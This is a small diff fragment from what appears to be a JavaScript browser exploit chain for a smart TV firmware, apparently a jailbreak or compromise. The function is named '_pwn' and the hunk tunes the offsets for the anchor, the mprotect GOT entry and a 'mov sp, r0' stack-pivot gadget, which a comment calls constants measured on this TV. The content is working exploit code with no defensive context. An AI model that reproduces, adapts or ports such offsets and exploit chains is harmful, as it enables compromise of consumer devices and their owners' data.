@@ -76,7 +76,7 @@ window.runPayload_fn = async function _pwn() {
 // script-scope names (kExpr*, kGCPrefix, ...). A `let kExpr...` or any
 // redeclaration here is a parse-time SyntaxError that kills the whole
 // page before the chain runs - pick distinct names.
-// ── Constantes medidas en ESTA TV (T-PTMxxxx-0090-2130) ───────────────────
+// ── Constantes medidas en ESTA TV (T-PTMxxxx-<FW_BUILD>) ───────────────────
   const ANCHOR_OFS      = 0x49a1cc0;   // was 0x49a2438
   const GOT_MPROTECT    = 0x526cfc4;   // was 0x526d748
   const PIVOT_OFS       = 0x1186088;   // was 0x1186288  (mov sp, r0)
